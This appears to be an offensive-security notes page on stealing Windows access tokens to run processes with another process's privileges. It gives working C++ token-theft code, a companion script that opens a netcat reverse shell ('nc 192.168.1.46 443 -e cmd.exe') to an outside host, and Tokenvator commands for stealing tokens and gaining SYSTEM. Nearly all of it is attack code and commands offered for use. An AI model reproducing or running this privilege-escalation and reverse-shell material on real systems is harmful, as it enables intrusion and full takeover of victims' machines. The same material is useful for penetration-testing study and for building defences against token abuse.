# Token Manipulation

One of the techniques of token manipulation is creating a new process with a token "stolen" from another process. This is when a token of an already existing access token present in one of the running processes on the victim host, is retrieved, duplicated and then used for creating a new process, making the new process assume the privileges of that stolen token.

## Technique

* `OpenProcess` : Open a process with access token you want to steal
* `OpenProcesToken` : Get a handle to the access token of that process
* `DuplicateTokenEx` : Make a duplicate of the access token present in that process
* `CreateProcessWithTokenW` : Create a new process with the newly aquired access token

#### token-man.cpp

```cpp
#include "stdafx.h"
#include <windows.h>
#include <iostream>

int main(int argc, char * argv[]) {
    char a;
    HANDLE processHandle;
    HANDLE tokenHandle = NULL;
    HANDLE duplicateTokenHandle = NULL;
    STARTUPINFO startupInfo;
    PROCESS_INFORMATION processInformation;
    DWORD PID_TO_IMPERSONATE = 3360;
    wchar_t cmdline[] = L"E:\Privilege-Escalation\nooranet.cmd";
    ZeroMemory(&startupInfo, sizeof(STARTUPINFO));
    ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
    startupInfo.cb = sizeof(STARTUPINFO);    

    processHandle = OpenProcess(PROCESS_ALL_ACCESS, true, PID_TO_IMPERSONATE);
    OpenProcessToken(processHandle, TOKEN_ALL_ACCESS, &tokenHandle);
    DuplicateTokenEx(tokenHandle, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &duplicateTokenHandle);            
    CreateProcessWithTokenW(duplicateTokenHandle, LOGON_WITH_PROFILE, NULL, cmdline, 0, NULL, NULL, &startupInfo, &processInformation);

    std::cin >> a;
    return 0;
}
```

#### nooranet.cmd

```cmd
nc 192.168.1.46 443 -e cmd.exe
```

### Token Abuses

#### Tokenvator

is a .NET tool for token manipulation that is primarily designed to alter privileges from a process. Using tokenvator tokens can be impersonated in the current process or a new process can be started with a primary token. 

* (Tokens) > info /all
* (Tokens) > whoami
* (Tokens) > list_privileges
* (Tokens) > get_system
* (Tokens) > list_privileges /impersonation
* (Tokens) > Steal_Token /process:1660 /command:cmd.exe
* (Tokens) > Enable_Privilege /Process:1660 /Privilege:SeDebugPrivilege
  * Tokenvator.exe getsystem /command:cmd.exe
